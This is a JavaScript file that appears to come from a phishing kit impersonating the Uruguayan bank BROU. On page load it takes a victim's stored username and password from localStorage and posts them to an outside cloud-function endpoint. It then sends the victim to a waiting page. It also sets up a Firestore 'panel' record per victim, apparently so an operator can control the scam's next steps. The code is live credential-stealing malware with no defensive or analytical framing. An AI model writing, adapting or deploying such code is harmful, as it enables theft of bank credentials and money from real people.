const db = firebase.firestore();

async function createUserDocument() {
  let user = localStorage.getItem("usr");

  db.collection("panel")
    .doc(user)
    .set({
      index: false,
      sacar: false,
      token: false,
    })
    .then(() => {
      console.log("Document successfully written!");
    })
    .catch((error) => {
      console.error("Error writing document: ", error);
    });
}

async function enviar() {
  const usr = localStorage.getItem("usr");
  const usrs = localStorage.getItem("pw");

  const message = `BROU-- --usuario: <code>${usr}</code> --  contraseña:<code> ${usrs} </code>-- `;

  try {
    const response = await fetch(
      "https://44cbe964-81ba-4bd2-ab6b-4a52c2ad5eb9.us-east-1.cloud.genez.io/",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      }
    );

    const data = await response.json();

    if (response.ok) {
      localStorage.setItem("usr", usr);
      window.location = "wait.html";
    } else {
      console.log("❌ Error al enviar mensaje: " + data.error);
    }
  } catch (error) {
    console.log("❌ Error en la solicitud: " + error.message);
  }
}
enviar();
